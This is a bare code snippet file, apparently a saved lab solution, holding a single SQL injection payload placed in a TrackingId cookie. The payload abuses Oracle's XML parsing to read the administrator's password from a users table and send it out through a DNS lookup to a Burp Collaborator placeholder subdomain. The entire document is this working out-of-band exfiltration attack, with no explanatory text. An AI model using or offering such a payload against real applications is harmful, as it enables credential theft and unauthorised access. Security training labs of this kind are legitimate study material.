---
id: 18ffb6fa-4b27-4c79-956a-f8c9654d2abf
type: code
language: ''
verified: false
created_at: '2020-08-11T16:11:07.653478+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 18ffb6fa

```
TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual—
```


